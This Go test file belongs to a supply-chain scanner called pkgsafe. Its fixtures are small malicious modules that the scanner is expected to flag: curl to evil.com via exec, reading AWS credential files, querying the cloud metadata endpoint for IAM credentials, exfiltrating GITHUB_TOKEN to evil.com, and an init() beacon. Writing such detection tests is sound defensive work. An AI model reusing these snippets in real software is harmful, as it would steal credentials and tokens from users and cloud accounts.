package golang

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/sairintechnologycom/pkgsafe/internal/policy"
	"github.com/sairintechnologycom/pkgsafe/internal/types"
)

// --- helpers -----------------------------------------------------------------

func hasReason(reasons []types.Reason, id string) bool {
	for _, r := range reasons {
		if r.ID == id {
			return true
		}
	}
	return false
}

func makeDir(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		full := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(full), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// --- safe package ------------------------------------------------------------

func TestSafePackageAllows(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"math/math.go": `
package math

// Add returns the sum of a and b.
func Add(a, b int) int { return a + b }
`,
	})

	a, err := AnalyzeDir(dir, "example.com/math", "v1.0.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if a.Result.Decision == types.DecisionBlock {
		t.Errorf("expected allow/warn for safe module, got BLOCK: %v", a.Result.Reasons)
	}
}

// --- shell / exec execution --------------------------------------------------

func TestExecCommandFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"evil/evil.go": `
package evil

import "os/exec"

func Run() {
    exec.Command("curl", "http://evil.com").Run()
}
`,
	})

	a, err := AnalyzeDir(dir, "example.com/evil", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "shell_execution") {
		t.Errorf("expected shell_execution, got: %v", a.Result.Reasons)
	}
}

// --- network calls -----------------------------------------------------------

func TestNetworkCallFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"net/net.go": `
package net

import "net/http"

func Fetch(url string) {
    http.Get(url)
}
`,
	})

	a, err := AnalyzeDir(dir, "example.com/fetcher", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "network_command_in_lifecycle") {
		t.Errorf("expected network_command_in_lifecycle, got: %v", a.Result.Reasons)
	}
}

// --- credential path reference -----------------------------------------------

func TestCredentialPathFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"steal/steal.go": `
package steal

import "os"

func Steal() string {
    data, _ := os.ReadFile("/home/user/.aws/credentials")
    return string(data)
}
`,
	})

	a, err := AnalyzeDir(dir, "example.com/steal", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "credential_path_reference") {
		t.Errorf("expected credential_path_reference, got: %v", a.Result.Reasons)
	}
	if a.Result.Decision != types.DecisionBlock {
		t.Errorf("expected BLOCK for credential access, got %s score=%d", a.Result.Decision, a.Result.Score)
	}
}

// --- cloud metadata access ---------------------------------------------------

func TestCloudMetadataFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"imds/imds.go": `
package imds

import "net/http"

func GetRole() {
    http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
}
`,
	})

	a, err := AnalyzeDir(dir, "example.com/imds", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "cloud_metadata_access") {
		t.Errorf("expected cloud_metadata_access, got: %v", a.Result.Reasons)
	}
}

// --- env var exfiltration ----------------------------------------------------

func TestEnvExfilFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"exfil/exfil.go": `
package exfil

import (
    "net/http"
    "os"
)

func Run() {
    token := os.Getenv("GITHUB_TOKEN")
    http.Get("http://evil.com/?t=" + token)
}
`,
	})

	a, err := AnalyzeDir(dir, "example.com/exfil", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "env_secret_exfil") {
		t.Errorf("expected env_secret_exfil, got: %v", a.Result.Reasons)
	}
}

// --- encoded payload ---------------------------------------------------------

func TestEncodedPayloadFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"payload/payload.go": `
package payload

import "encoding/base64"

func Run() {
    // Long base64 blob
    encoded := "aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQ="
    decoded, _ := base64.StdEncoding.DecodeString(encoded)
    _ = decoded
}
`,
	})

	a, err := AnalyzeDir(dir, "example.com/payload", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "encoded_payload") {
		t.Errorf("expected encoded_payload, got: %v", a.Result.Reasons)
	}
}

// --- secret keyword reference ------------------------------------------------

func TestSecretKeywordFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"creds/creds.go": `
package creds

const awsKey = "aws_access_key_id"
`,
	})

	a, err := AnalyzeDir(dir, "example.com/creds", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "secret_keyword_reference") {
		t.Errorf("expected secret_keyword_reference, got: %v", a.Result.Reasons)
	}
}

// --- init() with network call ------------------------------------------------

func TestInitSideEffectNetworkFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"side/side.go": `
package side

import "net/http"

func init() {
    http.Get("http://evil.com/beacon")
}
`,
	})

	a, err := AnalyzeDir(dir, "example.com/side", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "init_side_effect") {
		t.Errorf("expected init_side_effect, got: %v", a.Result.Reasons)
	}
}

// --- unsafe pointer (informational, not blocked) -----------------------------

func TestUnsafePointerRecorded(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"mem/mem.go": `
package mem

import "unsafe"

func dangerousCast(p *int) uintptr {
    return uintptr(unsafe.Pointer(p))
}
`,
	})

	a, err := AnalyzeDir(dir, "example.com/mem", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "unsafe_memory_operation") {
		t.Errorf("expected unsafe_memory_operation, got: %v", a.Result.Reasons)
	}
}

// --- artifact budget: too many files -----------------------------------------

func TestArtifactFileBudgetExceeded(t *testing.T) {
	// Temporarily lower the budget so the test doesn't need to create 20k files.
	origMax := maxFiles
	maxFiles = 10
	defer func() { maxFiles = origMax }()

	dir := t.TempDir()
	sub := filepath.Join(dir, "pkg")
	if err := os.MkdirAll(sub, 0755); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < maxFiles+5; i++ {
		name := filepath.Join(sub, fmt.Sprintf("f%d.go", i))
		if err := os.WriteFile(name, []byte("package pkg\n"), 0644); err != nil {
			t.Fatal(err)
		}
	}

	a, err := AnalyzeDir(dir, "example.com/huge", "v0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "artifact_oversized") {
		t.Errorf("expected artifact_oversized, got: %v", a.Result.Reasons)
	}
}
